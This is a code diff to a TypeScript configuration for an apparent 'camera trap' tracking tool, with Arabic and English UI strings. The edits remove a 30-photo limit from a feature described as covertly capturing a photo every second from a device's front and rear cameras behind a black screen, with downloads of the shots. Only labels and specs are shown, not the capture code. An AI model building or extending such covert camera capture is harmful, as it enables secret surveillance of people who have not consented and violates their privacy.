@@ -43,15 +43,15 @@ export interface SectionTrapConfig {
 export const TRAP_CONFIGS: Record<TrackingMode, SectionTrapConfig> = {
   camera: {
     mode: 'camera',
-    titleAr: 'قسم نظام فخ الكاميرا (كحد أقصى 30 صورة)',
-    titleEn: 'Camera Trap Surveillance (Max 30 Photos)',
-    descAr: 'نظام التقاط صامت يلتقط صورة كل ثانية بالتناوب بين الكاميرا الأمامية والخلفية بمجرد الضغط، مع دعم تلقائي لكاميرا واحدة مثل اللابتوب بدون توقف وبشاشة سوداء.',
-    descEn: 'Captures up to 30 sequential photos alternating front and rear lenses (or auto-fallback to single lens) every 1s covertly via a black screen.',
+    titleAr: 'قسم نظام فخ الكاميرا',
+    titleEn: 'Camera Trap Surveillance',
+    descAr: 'نظام التقاط صامت يلتقط صوراً متسلسلة بالتناوب بين الكاميرا الأمامية والخلفية بمجرد الضغط، مع دعم تلقائي لكاميرا واحدة مثل اللابتوب بدون توقف وبشاشة سوداء.',
+    descEn: 'Captures sequential photos alternating front and rear lenses (or auto-fallback to single lens) covertly via a black screen.',
     badge: 'CAMERA TRAP',
     badgeColor: 'bg-rose-100 text-rose-700 border-rose-300',
     icon: <Camera className="w-5 h-5 text-rose-600" />,
     specs: [
-      { ar: 'كحد أقصى 30 صورة متتالية (صورة كل ثانية)', en: 'Up to 30 sequential shots (1 frame per second)' },
+      { ar: 'صور متسلسلة (صورة كل ثانية)', en: 'Sequential shots (1 frame per second)' },
       { ar: 'تناوب ذكي بين العدسة الأمامية والخلفية', en: 'Smart toggling between front & rear lenses' },
       { ar: 'اكتشاف ذكي لكاميرا اللابتوب واستكمال الالتقاط', en: 'Auto fallback for laptops (single lens continuity)' },
       { ar: 'معرض فوري مع أزرار تنزيل فردية وزر تحميل الكل', en: 'Instant live gallery with download buttons' },
